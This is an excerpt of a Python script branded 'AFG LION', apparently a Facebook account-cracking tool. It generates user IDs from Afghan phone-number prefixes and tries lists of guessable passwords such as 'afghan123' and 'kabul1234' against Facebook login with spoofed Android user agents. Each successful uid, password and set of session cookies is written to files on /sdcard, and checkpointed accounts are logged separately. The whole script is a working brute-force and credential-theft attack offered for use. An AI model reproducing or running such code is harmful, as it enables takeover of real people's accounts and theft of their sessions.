...
def firex(ids,names,pasx,tl):
        ...
        kkkiii=str(len(oks))
        sys.stdout.write(f"\r\r{a}↳{w}[{a}AFG LION{w}]\x1b[0m-{w}[\x1b[38;5;39m{loop}{w}]\x1b[0m-{w}[{a}OK:{kkkiii}{w}]\x1b[0m-{w}[\x1b[38;5;39m{percentage}%{w}] ");sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
             ln = names.split(' ')[1]
        except:
        ...
        try:
             for pak in pasx:
                    ...
                    ua_agent = f"[FBAN/Orca-Android;FBAV/"+str(random.randrange(11,99))+".0.0."+str(random.randrange(1111,9999))+";FBBV/"+str(random.randrange(1111111,9999999))+";[FBAN/FB4A;FBAV/74.0.0.4636;FBBV/3230308;[FBAN/Orca-Android;FBAV/288.0.0.6261;FBPN/com.facebook.orca;FBLC/en_US;FBBV/728618838;FBCR/Tri;FBMF/samsung;FBBD/samsung;FBDV/SM-N770F|SM-N770F;FBSV/13;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1268,height=1513};FB_FW/1;FBRV/728618838]"
                    data = {"adid": adid,
    ...
    'viewport-width': '980',
                    ...
                    if 'session_key' in po:
                           ...
                           print(f"\r\r{a}↳{w}[{a}AFG LION🌸-💙{w}] {a}{uid} {I} {pwx}")
                           open("/sdcard/AFG LION🌸-M1-OK-COOKIE.txt","a").write(uid+'|'+pwx+'|'+str(coki)+'\n')
                           oks.append(uid)
                           break
                    elif 'www.facebook.com' in po['error']['message']:
                            uid = str(ids)
                            pwx = str(pas)
                            open('/sdcard/AFG LION🌸-M1-CP.txt','a').write(uid+'|'+pwx+'\n')
                            cps.append(uid)
                            break
                    else:
                            continue
...
def firek(ids,names,pasx,tl):
    ...
    'viewport-width': '980',
                    ...
                    if 'session_key' in po:
                           ...
                           coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                           print(f"\r\r{a}↳{w}[{a}AFG LION🌸-💙{w}] {a}{uid} {I} {pwx}")
                           open("/sdcard/AFG LION🌸-M2-OK-COOKIE.txt","a").write(uid+'|'+pwx+'|'+str(coki)+'\n')
                           oks.append(uid)
                           break
                    elif 'www.facebook.com' in po['error']['message']:
                            uid = str(ids)
                            pwx = str(pas)
                            open('/sdcard/AFG LION🌸-M2-CP.txt','a').write(uid+'|'+pwx+'\n')
                            cps.append(uid)
                            break
                    else:
                            continue
...
def rndxd():
        clear()
        #passlist = [uid[:6],uid[7],uid[8],huf[:6],uid,huf,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
        A = f"{h} CODE {I} 9379 {w}|{a} 9378 {w}|{a} 9377 {w}| {a}9370\n{g}"
        ...
        with terd(max_workers=30) as india:
                ...
                for huf in numbr:
                        uid = CODE+huf
                        passlist = [uid[:6],huf[2:8],huf[1:8],uid,huf,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
...
def idpaslogin(uid,passlist,tl):
        global loop,oks
        sys.stdout.write(f"\r\r{a}↳{w}[{a}AFG LION🌸-XD{w}]{a}-{w}[{a}{loop}{w}|{a}{tl}{w}]{a}-{w}[{a}OK:{str(len(oks))}{w}] ");sys.stdout.flush()
        try:
            for ps in passlist:
    ...
    'viewport-width': '980',
                    ...
                    if 'c_user' in log_cookies:
                           ...
                           if 'Photoshop' in res:
                                 print(f"\r\r{a}↳{w}[{a}AFG LION🌸-💙{w}] {a}{uid} {I} {ps}")
